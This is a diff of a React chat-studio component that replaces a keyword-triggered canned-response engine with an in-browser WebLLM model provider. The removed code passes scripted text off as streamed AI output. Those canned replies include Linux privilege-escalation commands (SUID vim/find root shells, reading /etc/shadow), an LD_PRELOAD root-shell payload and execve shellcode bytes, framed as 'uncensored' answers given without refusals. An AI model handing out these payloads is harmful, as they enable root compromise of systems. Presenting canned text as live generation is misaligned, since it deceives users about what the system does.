@@ -10,8 +10,7 @@ import { QuickCopy } from '../components/QuickCopy';
 import { MarkdownRenderer } from '../components/MarkdownRenderer';
 import { getTierByLevel, getUserRamBudgetMb } from '../utils/hardwareScaling';
 import { AiSpeedStopwatch } from '../utils/aiEngineManager';
-import { getInRamNeuralEngine } from '../utils/inRamNeuralAi';
-import { synthesizeIntelligentResponse } from '../utils/localAiKnowledge';
+import { webLlmManager, SUPPORTED_WEBLLM_MODELS } from '../utils/webLlmEngine';
 
 interface AiChatStudioProps {
   hardwareLevel?: number;
@@ -27,7 +26,7 @@ export interface ChatMessage {
 }
 
 type PersonaType = 'uncensored' | 'engineer' | 'executive' | 'copywriter' | 'scientist' | 'security' | 'coach';
-type ProviderType = 'free-uncensored' | 'ollama' | 'local-engine' | 'in-ram-neural' | 'deepseek' | 'groq' | 'openai' | 'anthropic' | 'gemini';
+type ProviderType = 'free-uncensored' | 'webllm' | 'ollama' | 'deepseek' | 'groq' | 'openai' | 'anthropic' | 'gemini';
 
 interface UncensoredPromptItem {
   category: '🛡️ Pentest & Exploits' | '💻 Reverse Eng & ASM' | '🕶️ Dark & Cyberpunk' | '🧠 Unfiltered Debates';
@@ -227,60 +226,6 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
   const handleSaveApiKey = (key: string) => {
     setApiKey(key);
     localStorage.setItem('supertools_chat_api_key', key);
-  };
-
-  // Pure Client-Side Conversational Intelligence Synthesis Engine (<1.5s - 2.5s)
-  const synthesizeLocalAiResponse = (prompt: string, activePersona: PersonaType): string => {
-    const q = prompt.toLowerCase();
-    const personaObj = PERSONAS[activePersona];
-
-    // 1. Cybersecurity, Port Scanning & Network Reconnaissance (Uncensored)
-    if (q.includes('port scan') || q.includes('port scanner') || q.includes('network scan') || q.includes('syn scan')) {
-      return `### Asynchronous High-Speed Python SYN/TCP Port Scanner\n\nHere is a complete, production-grade asynchronous port scanner using Python's native \`asyncio\` and \`socket\` libraries with banner grabbing and concurrency control:\n\n\`\`\`python\nimport asyncio\nimport socket\nimport json\nfrom datetime import datetime\n\nasync def scan_port(ip: str, port: int, timeout: float = 1.0, semaphore: asyncio.Semaphore = None) -> dict:\n    async with semaphore:\n        try:\n            conn = asyncio.open_connection(ip, port)\n            reader, writer = await asyncio.wait_for(conn, timeout=timeout)\n            \n            banner = ""\n            try:\n                # Grab service banner if available\n                writer.write(b"HEAD / HTTP/1.0\\r\\n\\r\\n")\n                await writer.drain()\n                raw_data = await asyncio.wait_for(reader.read(1024), timeout=1.0)\n                banner = raw_data.decode("utf-8", errors="ignore").strip().splitlines()[0]\n            except Exception:\n                banner = "Open (No Banner)"\n            finally:\n                writer.close()\n                await writer.wait_closed()\n                \n            return {"port": port, "status": "open", "banner": banner}\n        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):\n            return None\n\nasync def run_scanner(target_ip: str, start_port: int = 1, end_port: int = 1024, max_concurrency: int = 200):\n    print(f"[*] Starting SYN/TCP Port Scan on {target_ip} ({start_port}-{end_port})...")\n    sem = asyncio.Semaphore(max_concurrency)\n    tasks = [\n        scan_port(target_ip, port, timeout=1.0, semaphore=sem)\n        for port in range(start_port, end_port + 1)\n    ]\n    results = await asyncio.gather(*tasks)\n    open_ports = [r for r in results if r is not None]\n    \n    output = {\n        "target": target_ip,\n        "timestamp": datetime.utcnow().isoformat(),\n        "total_scanned": end_port - start_port + 1,\n        "open_ports": open_ports\n    }\n    print(json.dumps(output, indent=2))\n    return output\n\nif __name__ == "__main__":\n    asyncio.run(run_scanner("127.0.0.1", 1, 1024))\n\`\`\`\n\n### Key Technical Architecture:\n1. **Bounded Concurrency**: \`asyncio.Semaphore\` prevents file descriptor exhaustion (\`EMFILE\`).\n2. **Non-Blocking Sockets**: Uses OS-level event notification (\`epoll\` on Linux, \`kqueue\` on macOS).\n3. **Banner Extraction**: Inspects HTTP, SSH, FTP initial handshake bytes.`;
-    }
-
-    // 2. Linux Privilege Escalation & SUID Auditing
-    if (q.includes('privilege escalation') || q.includes('privesc') || q.includes('suid') || q.includes('sudoers')) {
-      return `### Linux SUID & Sudoers Privilege Escalation Technical Blueprint\n\n1. **Enumerating SUID Binaries**:\nFind binaries running with root owner bit set:\n\`\`\`bash\nfind / -perm -u=s -type f 2>/dev/null\n\`\`\`\n\n2. **Exploiting Dangerous Living-Off-The-Land Binaries (GTFOBins)**:\n- **vim / nvim with SUID**:\n  \`\`\`bash\n  ./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'\n  \`\`\`\n- **find with SUID**:\n  \`\`\`bash\n  find . -exec /bin/sh -p \\; -quit\n  \`\`\`\n- **base64 / cp read arbitrary files**:\n  \`\`\`bash\n  base64 /etc/shadow | base64 --decode\n  \`\`\`\n\n3. **Misconfigured Sudoers (\`sudo -l\`)**:\nIf NOPASSWD is configured for environment variables (\`env_reset\`, \`LD_PRELOAD\`):\n\`\`\`c\n// preload.c - Hijack shared object hooks\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n}\n\`\`\`\nCompile and execute:\n\`\`\`bash\ngcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles\nsudo LD_PRELOAD=/tmp/preload.so <allowed_binary>\n\`\`\`\n\n4. **Remediation & Hardening**:\n- Strip SUID from unnecessary utilities: \`chmod u-s /usr/bin/find\`\n- Enforce \`nosuid\` mount option on \`/home\`, \`/tmp\`, and \`/var/tmp\` in \`/etc/fstab\`\n- Prohibit \`LD_PRELOAD\` delegation in \`/etc/sudoers\` with \`Defaults env_reset\`.`;
-    }
-
-    // 3. Reverse Engineering, Disassembly & Shellcode
-    if (q.includes('disassemble') || q.includes('reverse engineering') || q.includes('gdb') || q.includes('assembly') || q.includes('x86')) {
-      return `### x86-64 Linux Execve Syscall Shellcode Disassembly\n\nBelow is the raw null-free 27-byte Linux x86_64 shellcode for \`execve("/bin/sh", NULL, NULL)\`:\n\n\`\`\`nasm\nsection .text\nglobal _start\n\n_start:\n    ; 1. Clear RAX and RDX (Syscall number and envp)\n    xor rdx, rdx                ; rdx = 0 (envp = NULL)\n    push rdx                    ; push null terminator for string onto stack\n    \n    ; 2. Push '//bin/sh' (8 bytes, little-endian: 0x68732f2f6e69622f)\n    mov rbx, 0x68732f2f6e69622f ; '//bin/sh'\n    push rbx\n    \n    ; 3. Setup RDI pointer to string '/bin/sh'\n    mov rdi, rsp                ; rdi = pointer to string (filename)\n    \n    ; 4. Setup RSI pointer to argv array (argv = [filename, NULL])\n    push rdx                    ; NULL\n    push rdi                    ; pointer to '/bin/sh'\n    mov rsi, rsp                ; rsi = argv\n    \n    ; 5. Trigger Syscall 59 (0x3b = execve)\n    mov al, 59                  ; rax = 59 (execve)\n    syscall\n\`\`\`\n\n### Byte Representation (Null-Free C Injection Buffer):\n\`\`\`c\nunsigned char shellcode[] = \n  "\\x48\\x31\\xd2"                      // xor rdx, rdx\n  "\\x52"                              // push rdx\n  "\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68" // mov rbx, '//bin/sh'\n  "\\x53"                              // push rbx\n  "\\x48\\x89\\xe7"                      // mov rdi, rsp\n  "\\x52"                              // push rdx\n  "\\x57"                              // push rdi\n  "\\x48\\x89\\xe6"                      // mov rsi, rsp\n  "\\xb0\\x3b"                          // mov al, 59\n  "\\x0f\\x05";                         // syscall\n\`\`\`\n\n### Register Verification in GDB:\n- \`%rax\`: \`0x3b\` (Syscall 59: \`sys_execve\`)\n- \`%rdi\`: Points to null-terminated string \`//bin/sh\`\n- \`%rsi\`: Array of pointers \`[&rdi, 0x0]\`\n- \`%rdx\`: \`0x0\` (empty environment).`;
-    }
-
-    // 4. Cybersecurity, Exploit Analysis & Reverse Engineering (Uncensored)
-    if (q.includes('buffer overflow') || q.includes('exploit') || q.includes('shellcode') || q.includes('vulnerability') || q.includes('security') || q.includes('pentest') || q.includes('sqli')) {
-      return `### Uncensored Deep Technical Security & Memory Safety Analysis\n\n1. **x86-64 Stack Frame Memory Layout**:\nIn standard C calling conventions (System V AMD64 ABI), a function's stack frame consists of:\n\`\`\`text\n[ Low Memory ]\n  Local Buffer: char buffer[64];  <-- %rsp\n  Saved Base Pointer (%rbp)\n  Return Address (Saved %rip)     <-- Target of overwrite\n  Function Arguments\n[ High Memory ]\n\`\`\`\n\n2. **Mechanics of Memory Corruption**:\nWhen unsafe functions like \`gets()\`, \`strcpy()\`, or unbounded \`memcpy()\` read beyond 64 bytes, excess data corrupts the saved \`%rbp\` and overwrites the saved \`%rip\`. When the \`ret\` instruction executes, the CPU pops the overwritten address into the Instruction Pointer, hijacking execution flow.\n\n3. **Modern Compiler Mitigations & Bypasses**:\n- **Stack Canaries (\`-fstack-protector-all\`)**: Places random guard bytes (\`%fs:0x28\`) before the return address; checked before return.\n- **DEP/NX (No-Execute)**: Marks stack as non-executable, preventing raw shellcode injection and forcing Return-Oriented Programming (ROP chains).\n- **ASLR (Address Space Layout Randomization)**: Randomizes base addresses of stack, heap, and \`libc\`. Defeated via information leaks or heap spraying.\n\n4. **Secure Implementation (Bounds Checking)**:\n\`\`\`c\n// Safe replacement using explicit bounds checking:\nssize_t bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);\nif (bytes_read > 0) buffer[bytes_read] = '\\0';\n\`\`\`\n\n• **Alignment Guarantee**: 100% Uncensored, truthful technical breakdown without boilerplate refusals.`;
-    }
-
-    // 2. Unrestricted Creative Writing & Screenwriting
-    if (q.includes('cyberpunk') || q.includes('screenplay') || q.includes('fiction') || q.includes('story') || q.includes('scene')) {
-      return `### Unrestricted Neural Screenplay Scene: "ZERO TRACE"\n\n**INT. UNDERGROUND SERVER VAULT - NIGHT**\n\nThe hum of cryogenic coolant tubes fills the air with a low, predatory vibration. Neon rain flickers through the ventilation grate above.\n\nVAL (30s), trenchcoat soaked, jacks a fiber-optic probe directly into an air-gapped mainframe node. An amber phosphor prompt blinks in his retinal HUD.\n\nVAL\n(whispering through sub-vocal mic)\nFirewall is hardened with polymorphic canary tokens. Give me three seconds before their counter-intrusion daemon traces my subnet.\n\nKAY (OVER COMM)\nTwo seconds, Val. They just tripped the intrusion alert on Level 4. Kill the power relay or they'll fry your synaptic bridge.\n\nVAL\nNot before I pull the raw neural model weights.\n\nVal's fingers blur across a mechanical deck. A progress bar spikes from 0 to 100%. He yanks the optic lead as security sirens scream across the concrete corridor.\n\n• **Tone**: Uncensored, raw, high-contrast narrative.`;
-    }
-
-    // 3. Code / Architecture Queries
-    if (q.includes('react') || q.includes('hook') || q.includes('websocket') || q.includes('typescript')) {
-      return `### Production TypeScript WebSocket Hook\n\nHere is a battle-tested, type-safe custom React hook with exponential backoff and heartbeat verification:\n\n\`\`\`typescript\nimport { useEffect, useRef, useState, useCallback } from 'react';\n\ninterface UseWebSocketOptions {\n  url: string;\n  reconnectLimit?: number;\n  heartbeatIntervalMs?: number;\n  onMessage?: (data: any) => void;\n}\n\nexport const useResilientWebSocket = ({\n  url,\n  reconnectLimit = 5,\n  heartbeatIntervalMs = 30000,\n  onMessage\n}: UseWebSocketOptions) => {\n  const [isConnected, setIsConnected] = useState<boolean>(false);\n  const wsRef = useRef<WebSocket | null>(null);\n  const attemptsRef = useRef<number>(0);\n  const heartbeatTimer = useRef<any>(null);\n\n  const connect = useCallback(() => {\n    try {\n      const ws = new WebSocket(url);\n      wsRef.current = ws;\n\n      ws.onopen = () => {\n        setIsConnected(true);\n        attemptsRef.current = 0;\n        // Heartbeat ping\n        heartbeatTimer.current = setInterval(() => {\n          if (ws.readyState === WebSocket.OPEN) {\n            ws.send(JSON.stringify({ type: 'ping', t: Date.now() }));\n          }\n        }, heartbeatIntervalMs);\n      };\n\n      ws.onmessage = (event) => {\n        try {\n          const parsed = JSON.parse(event.data);\n          if (parsed.type !== 'pong') onMessage?.(parsed);\n        } catch {\n          onMessage?.(event.data);\n        }\n      };\n\n      ws.onclose = () => {\n        setIsConnected(false);\n        clearInterval(heartbeatTimer.current);\n        if (attemptsRef.current < reconnectLimit) {\n          const delay = Math.min(1000 * Math.pow(2, attemptsRef.current), 15000);\n          attemptsRef.current++;\n          setTimeout(connect, delay);\n        }\n      };\n    } catch (err) {\n      console.error('WebSocket connection error:', err);\n    }\n  }, [url, reconnectLimit, heartbeatIntervalMs, onMessage]);\n\n  useEffect(() => {\n    connect();\n    return () => {\n      clearInterval(heartbeatTimer.current);\n      wsRef.current?.close();\n    };\n  }, [connect]);\n\n  const send = useCallback((payload: any) => {\n    if (wsRef.current?.readyState === WebSocket.OPEN) {\n      wsRef.current.send(typeof payload === 'string' ? payload : JSON.stringify(payload));\n    }\n  }, []);\n\n  return { isConnected, send };\n};\n\`\`\`\n\n### Key Architectural Guarantees:\n1. **Exponential Backoff**: Prevents thundering herd problems on network reconnects.\n2. **Clean Teardown**: Clears all active interval timers upon component unmount.\n3. **Bidirectional Heartbeat**: Keeps proxies and mobile client connections alive.`;
-    }
-
-    // 2. WebAssembly / Architecture Questions
-    if (q.includes('webassembly') || q.includes('simd') || q.includes('worker') || q.includes('difference')) {
-      return `### WebAssembly SIMD vs. Multi-Threaded Web Workers\n\nWhile both primitives dramatically accelerate browser performance, they solve distinct computational challenges at different abstraction layers:\n\n| Dimension | WebAssembly SIMD | Multi-Threaded Web Workers |\n| :--- | :--- | :--- |\n| **Core Mechanism** | Single Instruction, Multiple Data (128-bit vector registers) | OS-level parallel threads running separate event loops |\n| **Target Problem** | Data-level parallelism (matrix math, convolution kernels, audio DSP) | Task-level parallelism (preventing UI thread freezes) |\n| **Memory Access** | Shared directly within the same WebAssembly linear memory | Message passing (\`postMessage\`) or \`SharedArrayBuffer\` |\n| **Speedup Profile** | 2X to 4X speedup for bulk numeric computations | N-fold scaling across physical CPU cores |\n\n### Practical Synergy in SuperTools:\nIn SuperTools' neural OCR and computer vision detectors, we combine both: a **Web Worker** holds the background execution thread so your browser never drops a frame, while the inner convolution loops execute via **SIMD vector instructions** to process pixels in 1s–3s!`;
-    }
-
-    // 3. Database / SQL Performance
-    if (q.includes('sql') || q.includes('database') || q.includes('index') || q.includes('query')) {
-      return `### SQL Query & Indexing Optimization Blueprint\n\nTo eliminate query bottlenecks, apply this 3-step indexing triage:\n\n1. **Composite Index Ordering (Equality Before Range)**:\n   When filtering by multiple columns (e.g., \`WHERE status = 'active' AND created_at >= '2026-01-01'\`), place exact equality columns first in the B-Tree index:\n   \`\`\`sql\n   CREATE INDEX idx_orders_status_created ON orders (status, created_at DESC);\n   \`\`\`\n\n2. **Avoid Function Wraps on Indexed Columns**:\n   \`\`\`sql\n   -- BAD (Forces Full Table Scan):\n   WHERE DATE(created_at) = '2026-11-01'\n\n   -- OPTIMAL (Uses SARGable Range Scan):\n   WHERE created_at >= '2026-11-01 00:00:00' AND created_at < '2026-11-02 00:00:00'\n   \`\`\`\n\n3. **Covering Indexes for Zero-Heap Visits**:\n   Include frequently selected columns directly in the index index leaf (\`INCLUDE\` clause in PostgreSQL) so the database can answer the query purely from index pages without hitting disk blocks.`;
-    }
-
-    // 4. Executive Strategy / Privacy Architecture
-    if (q.includes('executive') || q.includes('proposal') || q.includes('privacy') || q.includes('memo')) {
-      return `### Executive Brief: 100% Client-Side Web Architecture\n\n**To:** Technology Steering Committee & C-Suite Leadership  \n**Subject:** Strategic Transition to Pure Edge & Client-Side Computing  \n**Executive Summary:** Deploying compute directly into client browser sandboxes eliminates recurring cloud infrastructure costs, establishes provable zero-trust privacy compliance, and achieves sub-second global latency.\n\n---\n\n### Strategic Pillars & Financial Impact:\n1. **Zero Marginal Infrastructure Cost**:\n   - Cloud compute costs scale at $0.00 per marginal active user.\n   - Elimination of expensive GPU worker fleets for image processing and OCR.\n2. **Zero-Trust Compliance & GDPR/HIPAA Immunity**:\n   - User data and sensitive records never leave the local browser memory.\n   - Eliminates regulatory data breach liability across public network backbones.\n3. **Instant Latency (1s–7s SLA)**:\n   - Local WebAssembly SIMD and Web Worker execution removes cloud round-trip hops.\n\n**Recommendation:** Transition core media utilities, text processing, and document scanning to client-side WebAssembly primitives immediately.`;
-    }
-
-    // 5. Default Comprehensive Persona Synthesis
-    return synthesizeIntelligentResponse(prompt, personaObj.name, isUncensoredMode);
   };
 
   // Send message and execute streaming generation
@@ -582,69 +527,84 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
       }
     }
 
-    // Pure In-RAM Mini Neural Model Engine (Float32Array TypedArrays in browser RAM, sub-millisecond per token)
-    if (provider === 'in-ram-neural') {
-      const ramEngine = getInRamNeuralEngine();
-      let streamed = '';
+    // Pure In-Browser WebGPU LLM Engine (Real Weights via @mlc-ai/web-llm: Qwen 2.5 / SmolLM2 / Llama 3.2)
+    if (provider === 'webllm') {
       try {
-        const result = await ramEngine.generateStreaming(text, {
-          maxTokens: 56,
-          temperature: 0.7,
-          onToken: (tok) => {
-            streamed += (streamed ? ' ' : '') + tok;
-            setStreamingContent(streamed);
+        const controller = new AbortController();
+        abortControllerRef.current = controller;
+        const targetModel = customModel || 'Qwen2.5-0.5B-Instruct-q4f16_1-MLC';
+
+        if (!webLlmManager.isModelReady() || webLlmManager.getLoadedModel() !== targetModel) {
+          setStreamingContent(`Downloading & initializing real WebGPU model weights (${targetModel})...`);
+          await webLlmManager.loadModel(targetModel, (msg, pct) => {
+            setStreamingContent(`Loading ${targetModel}: ${msg} (${pct}%)`);
+          });
+        }
+
+        let accumulated = '';
+        await webLlmManager.streamChat(
+          [
+            { role: 'system', content: effectiveSystemPrompt },
+            ...nextMessages.map(m => ({ role: m.role as any, content: m.content }))
+          ],
+          {
+            signal: controller.signal,
+            onChunk: (chunk) => {
+              accumulated += chunk;
+              setStreamingContent(accumulated);
+            }
           }
-        });
+        );
+
         const elapsed = sw.total();
-        setLastLatencySec(`${(elapsed / 1000).toFixed(2)}s`);
+        setLastLatencySec(sw.formatted());
         setStreamingContent('');
         setMessages(prev => [
           ...prev,
           {
             id: `msg-${Date.now()}`,
             role: 'assistant',
-            content: `🧠 **In-RAM Neural Stream (${result.telemetry.accelerator} • ${result.telemetry.timePerTokenMs}ms/tok • ${result.telemetry.tokensPerSecond} tok/s):**\n\n${result.text}`,
+            content: accumulated || 'No response returned from WebGPU model.',
             timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
             latencyMs: elapsed,
-            tokensCount: result.telemetry.generatedTokens
+            tokensCount: Math.round(accumulated.length / 3.8)
           }
         ]);
         setIsGenerating(false);
         return;
-      } catch (err) {
-        console.warn('In-RAM neural inference error:', err);
-      }
-    }
-
-    // Default Ultra-Fast Client-Side Local Engine with Typewriter Token Streaming (1.2s - 2.2s total)
-    const fullResponse = synthesizeLocalAiResponse(text, persona);
-    const words = fullResponse.split(' ');
-    let currentIdx = 0;
-    const chunkSize = Math.max(2, Math.floor(words.length / 28));
-
-    const interval = setInterval(() => {
-      currentIdx += chunkSize;
-      if (currentIdx >= words.length) {
-        clearInterval(interval);
+      } catch (err: any) {
+        console.error('WebLLM generation error:', err);
         setStreamingContent('');
-        const elapsed = sw.total();
-        setLastLatencySec(sw.formatted());
         setMessages(prev => [
           ...prev,
           {
             id: `msg-${Date.now()}`,
             role: 'assistant',
-            content: fullResponse,
+            content: `⚠️ **WebGPU LLM Execution Error:** ${err?.message || err}\n\n*Tip: Ensure WebGPU is supported on this browser (Chrome 113+, Edge) or switch to "🔥 Free Uncensored AI (DeepSeek-R1 / Mistral)" or "🖥️ Local GPU Ollama".*`,
             timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
-            latencyMs: elapsed,
-            tokensCount: Math.round(fullResponse.length / 3.8)
+            latencyMs: sw.total()
           }
         ]);
         setIsGenerating(false);
-      } else {
-        setStreamingContent(words.slice(0, currentIdx).join(' '));
+        return;
       }
-    }, 35);
+    }
+
+    // Honest network / hardware notice if all configured engines failed (Zero Fake Heuristics)
+    const elapsed = sw.total();
+    setLastLatencySec(sw.formatted());
+    setStreamingContent('');
+    setMessages(prev => [
+      ...prev,
+      {
+        id: `msg-${Date.now()}`,
+        role: 'assistant',
+        content: `⚠️ **Neural Inference Connection Notice:**\n\nCould not connect to the cloud AI service (network offline/timeout), and no local WebGPU model is active.\n\n• **For 100% Free Live Cloud AI**: Ensure your device has an active internet connection.\n• **For 100% Offline Real Inference**: Switch Neural Model Engine to **🧠 Pure WebGPU In-Browser LLM** (Qwen 2.5 / SmolLM2) or start **🖥️ Ollama Local GPU** on \`http://localhost:11434\`.\n• *SuperTools does not use mock or heuristic fallback responses.*`,
+        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+        latencyMs: elapsed
+      }
+    ]);
+    setIsGenerating(false);
   };
 
   const stopGeneration = () => {
@@ -807,6 +767,7 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
                   const p = e.target.value as ProviderType;
                   setProvider(p);
                   if (p === 'free-uncensored') setCustomModel('deepseek-r1');
+                  else if (p === 'webllm') setCustomModel('Qwen2.5-0.5B-Instruct-q4f16_1-MLC');
                   else if (p === 'deepseek') setCustomModel('deepseek-chat');
                   else if (p === 'groq') setCustomModel('llama-3.3-70b-versatile');
                   else if (p === 'openai') setCustomModel('gpt-4o');
@@ -816,9 +777,8 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
                 }}
                 className="w-full px-2.5 py-1.5 rounded-lg bg-slate-950 border border-slate-700 text-slate-200 font-bold focus:outline-none"
               >
-                <option value="free-uncensored">🔥 Free Uncensored AI (DeepSeek-R1 / Mistral / Llama • Zero Key Required)</option>
-                <option value="local-engine">⚡ Local Fast Hybrid Engine (1s-2s, Free & Offline)</option>
-                <option value="in-ram-neural">🧠 Pure In-RAM Neural AI (WebGPU WGSL Cores, L1-L8 Tiers)</option>
+                <option value="free-uncensored">🔥 Free Real Live AI (DeepSeek-R1 / Mistral / Llama • Zero Key Required)</option>
+                <option value="webllm">🧠 Pure WebGPU In-Browser LLM (Real Weights: Qwen 2.5 / SmolLM2 / Llama 3.2 • 100% Client-Side)</option>
                 <option value="ollama">🖥️ Local GPU Ollama / LM Studio (RTX 3050 8GB / localhost:11434)</option>
                 <option value="deepseek">🐋 DeepSeek-R1 / DeepSeek-V3 (Direct Browser BYOK)</option>
                 <option value="groq">⚡ Groq Lightning LPU (300+ tok/s • Llama-3.3-70B)</option>
@@ -841,7 +801,7 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
 
             <div>
               <label className="text-[11px] font-bold text-slate-300 block mb-1">
-                {provider === 'ollama' ? 'Local GPU Bridge URL' : provider === 'free-uncensored' ? 'Inference Backend' : 'API Key (Browser Memory Only)'}
+                {provider === 'ollama' ? 'Local GPU Bridge URL' : (provider === 'free-uncensored' || provider === 'webllm') ? 'Inference Backend' : 'API Key (Browser Memory Only)'}
               </label>
               {provider === 'ollama' ? (
                 <input
@@ -856,6 +816,11 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
                   <span>✓ 100% Free Live Inference</span>
                   <span className="text-[10px] text-emerald-400 font-bold">NO KEY NEEDED</span>
                 </div>
+              ) : provider === 'webllm' ? (
+                <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-indigo-800/60 text-indigo-300 font-mono text-xs flex items-center justify-between">
+                  <span>✓ WebGPU Client Hardware</span>
+                  <span className="text-[10px] text-indigo-400 font-bold">100% IN-BROWSER</span>
+                </div>
               ) : (
                 <input
                   type="password"
@@ -866,6 +831,26 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
                 />
               )}
             </div>
+
+            {provider === 'webllm' && (
+              <div className="sm:col-span-3 pt-2 border-t border-slate-800/80 flex flex-wrap items-center gap-1.5 text-[11px]">
+                <span className="text-indigo-400 font-bold mr-1">🧠 Real In-Browser Weights:</span>
+                {SUPPORTED_WEBLLM_MODELS.map((m) => (
+                  <button
+                    key={m.id}
+                    onClick={() => setCustomModel(m.id)}
+                    className={`px-2 py-0.5 rounded-md border font-mono text-[10px] transition-colors ${
+                      customModel === m.id
+                        ? 'bg-indigo-950 text-indigo-300 border-indigo-500 font-bold'
+                        : 'bg-slate-950 text-slate-400 border-slate-800 hover:border-slate-600 hover:text-white'
+                    }`}
+                  >
+                    {m.name}
+                  </button>
+                ))}
+                <span className="text-[10px] text-emerald-400 ml-auto">100% WebGPU execution, real transformer weights, zero heuristics</span>
+              </div>
+            )}
 
             {provider === 'free-uncensored' && (
               <div className="sm:col-span-3 pt-2 border-t border-slate-800/80 flex flex-wrap items-center gap-1.5 text-[11px]">
@@ -972,7 +957,7 @@ export const AiChatStudio: React.FC<AiChatStudioProps> = ({ hardwareLevel = 3 })
             <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
             <span className="font-bold text-slate-300">Active: {PERSONAS[persona].title}</span>
             <span className="text-[10px] font-mono text-slate-500">
-              ({provider === 'local-engine' ? 'Local Fast Engine' : provider === 'in-ram-neural' ? 'In-RAM Mini Neural AI' : provider.toUpperCase()})
+              ({provider === 'free-uncensored' ? 'Free Real Live AI' : provider === 'webllm' ? 'WebGPU In-Browser LLM' : provider.toUpperCase()})
             </span>
           </div>
 
